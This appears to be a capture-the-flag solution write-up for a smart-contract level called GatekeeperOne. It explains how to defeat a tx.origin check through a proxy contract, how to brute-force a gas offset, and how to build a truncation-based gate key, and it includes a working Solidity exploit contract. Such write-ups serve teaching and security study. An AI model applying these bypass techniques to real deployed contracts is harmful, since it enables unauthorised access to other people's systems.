# Answer

Goal: Register as an entrant.

## 1. Passing gate one

The first modifier requires that the `msg.sender` and `tx.origin` would NOT be the same address. This means we'll be using a smart contract as a proxy to execute the exploit.

## 2. Passing gate two

This modifier checks that a multiple of 8191 gas would be left at that point. We've tried estimating the exact amount of gas to be passed, but the more fullproof method in the end was adding a loop and brute forcing the exact amount. We've added a script similar to this:

```js
for (let extraGas = 0; extraGas < 1000; extraGas++) {
  try {
    await proxyContract.exploit(extraGas)
  } catch (_) {}
}
```

```solidity
function exploit(uint256 extraGas) external {
    // 163820 is a large enough multiple of 8191 to be certain to cover any remaining gas needs
    g.enter{gas: 163820 + extraGas}();
}
```

## 3. Passing gate three

The gate three may seem a bit daunting, but if we break down each comparison:

1. Last 32 bit and 16 bit number versions of `_gateKey` have to be equal => if we take 32 bit hex number the xxxxyyyy the "x" hex values have to be 0 for this to be true.

2. Last 64 bit and 32 bit number versions of `_gateKey` have to be NOT equal => we extend the previous 32 bit hex number with "z" - zzzzzzzzxxxxyyyy and "z" value canNOT be equal to 0 for this to be true.

3. Final comparison adds a dependancy on the transaction originator. The 32 bit hex number xxxxyyyy where we now know that x is 0 has match the last 16 bits of the originator address. Means that yyyy has to equal the final 4 hexes of the address.

In the end we get a 64 bit (8 byte) number where if we divided into before mentioned z x y parts - zzzzzzzzxxxxyyyy:

- zzzzzzzz - can be any value except 0;
- xxxx - has be equal to 0;
- yyyy - has to match the final 4 hexes of the address

## 4. Entering the smart contract

Since the extra gas was the only uncertainty in our case the exploit contract looked like this. The `extraGas` value turned out to be 250.

```solidity
contract GatekeeperOneExploit {
    GatekeeperOne g;

    constructor(address targetAddr) public {
        g = GatekeeperOne(targetAddr);
    }

    // last four hexes of the sender
    // 0x00000000000000000000000000000000000093BC
    function exploit(uint256 extraGas) external {
        uint64 gateKey = 4295005116;

        g.enter{gas: 163820 + extraGas}(bytes8(gateKey));
    }
}
```
